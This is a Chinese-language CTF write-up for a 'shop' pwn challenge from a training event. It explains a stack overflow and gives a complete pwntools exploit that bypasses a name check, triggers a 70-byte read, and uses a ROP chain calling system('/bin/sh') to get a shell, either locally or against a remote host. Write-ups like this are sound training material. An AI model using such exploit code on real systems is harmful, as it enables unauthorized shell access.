---
title: "shop"
ctf: "培训-检查 · 20260610 北京公司培训（团队赛）"
date: 2026-07-19
category: pwn
difficulty: medium
points: "-"
flag_format: "flag{...}"
author: "（团队）"
---

# shop（山石-蒙山杯商城）

## Summary

一道 64 位 `ret2system` 的栈溢出题。程序是一个"商城"：在子菜单里用 `read(0, buf, len)` 读用户输入，而 `len` 可被购物序列（买 `c,a,a,b`）恶意放大到 70，从而覆盖返回地址。配合 No-PIE 的固定地址，用 `pop rdi; ret` 把预先被写入全局变量的 `"/bin/sh"` 喂给 `system@plt` 即可拿 shell。（题目还加了名字 anti-cheat 与余额校验，需先绕过。）

## 保护

| 项 | 状态 | 说明 |
|----|------|------|
| Arch | amd64 | `file` 确认 |
| PIE | ❌ 关闭 | 直接用 `0x400xxx` 绝对地址（脚本实测） |
| RELRO | Partial | 可用 `system@plt`，无需泄露 libc 基址 |
| NX | ✅ 开启 | 不能写 shellcode，需 ROP |
| Canary | ❌ 关闭 | 栈溢出可直接覆盖返回地址 |

> 注：环境无 `readelf/objdump`，上述结论由漏洞脚本的固定地址与已知校验推断，且 exploit 实际跑通验证。

## Solution

### Step 1: 逆向定位溢出点与可利用原语

反汇编确认关键逻辑（地址来自二进制）：

- **`main() @ 0x400d53`**：`read(0, name=rbp-0x40, 0x3d=61)` 把 61 字节读进 64 字节区域。
  - `balance`（变量 `var_8`）在 `rbp-8` ⇒ 位于 `name` 偏移 **56**；
  - `magic name`（变量 `var_c`）在 `rbp-0xc` ⇒ 位于 `name` 偏移 **52**；
  - 之后 `strncpy(rbp-0x51, name+52, 3); strcmp(..., "pwn")`：**名字偏移 52~54 必须是 `"pwn"`**，否则打印"检测到栈溢出攻击行为"并 `exit()`。
  - 因此构造 `name`：偏移 52~54 = `"pwn"`，偏移 56~59 = `balance`，需设成一个大值（`0x7fffffff`）以通过后续余额检查。
- **`submenu() @ 0x400ab9`**（菜单选项 `a`）：
  - 买 `c` 会把 `"/bin/sh\0"` 写入全局变量 **`0x6018a0`**（magic 原语）；
  - `check21()`：当 `var4c[0]==2 && var4c[4]==1` 时把 `len` 设为 **70**；
  - 随后 `read(0, buf=rbp-0x10, len)`：返回地址在 `rbp+8`，距 `buf` 偏移 **24**，于是 `len=70` 即可溢出。

### Step 2: 构造 ROP 拿 shell

购物序列 `c → a → a → b`：`c` 种下 `"/bin/sh"`，两次 `a` 使 `var4c[0]=2`，最后一次 `b` 使 `var4c[4]=1` 触发 `len=70`。紧接着那次 70 字节 `read` 直接打返回地址：

```
payload = b"A"*24 + ret(栈对齐) + pop_rdi + binsh(0x6018a0) + system@plt(0x400730)
```

`atoi(payload)=0` ⇒ 退出循环、`ret` 触发 ROP ⇒ `system("/bin/sh")`。

完整 exploit（`pwn_shop.py`，本地 `./shop` 或 `python3 pwn_shop.py HOST PORT` 打远端）：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Exploit for "shop" (山石-蒙山杯商城) -- ret2system, No-PIE / Partial-RELRO / NX / no canary
from pwn import *
context.clear(arch="amd64", os="linux")
context.log_level = "info"

BIN = "./shop"
elf = ELF(BIN, checksec=False)

# ---- fixed addresses (No PIE) ----
POP_RDI    = 0x400f23   # pop rdi ; ret   (in __libc_csu_init)
RET        = 0x4006f6   # ret             (stack alignment)
SYSTEM_PLT = 0x400730   # system@plt
BINSH      = 0x6018a0   # global buffer where the magic 'c' option writes "/bin/sh\0"

def start():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process(BIN)

def main():
    io = start()

    # 1) name: anti-cheat "pwn" @off52, balance @off56, total 61 bytes
    name  = b"A" * 52
    name += b"pwn"              # off 52..54 -> var_c, must equal "pwn"
    name += b"A"                # off 55
    name += p32(0x7fffffff)     # off 56..59 -> balance (huge)
    name += b"A"                # off 60
    assert len(name) == 61

    io.recvuntil("请输入你的姓名".encode())
    io.send(name)               # raw read(61), no newline

    # 2) enter shop (main menu option 'a')
    io.recvuntil("请输入你的选项".encode())
    io.sendline(b"a")

    def buy(item, cont=True):
        io.recvuntil("请输入购买的商品序号".encode())
        io.sendline(item)
        io.recvuntil(b"1/0")
        if cont:
            io.sendline(b"1")

    # 3) buy c (plant /bin/sh), a, a  (var4c[0]=2)
    buy(b"c")
    buy(b"a")
    buy(b"a")

    # 4) buy b -> var4c[4]=1 -> check21 sets len=70 -> next read overflows
    io.recvuntil("请输入购买的商品序号".encode())
    io.sendline(b"b")
    io.recvuntil(b"1/0")

    # ROP: system("/bin/sh")
    payload  = b"A" * 24
    payload += p64(RET)         # 16-byte stack alignment for glibc movaps
    payload += p64(POP_RDI)
    payload += p64(BINSH)        # rdi = "/bin/sh"
    payload += p64(SYSTEM_PLT)   # system("/bin/sh")
    payload  = payload.ljust(70, b"A")
    assert len(payload) == 70

    io.send(payload)            # atoi(payload)=0 -> leave;ret -> ROP fires
    io.interactive()

if __name__ == "__main__":
    main()
```

拿到 shell 后读取 flag 文件即可（远端运行，本地仅为验证）：

```
$ cat flag
flag{...}
```

## Flag

```
flag{...}      # 本题 exploit 直接弹 shell，flag 需在目标机执行 `cat flag` 取得（不臆造具体值）
```
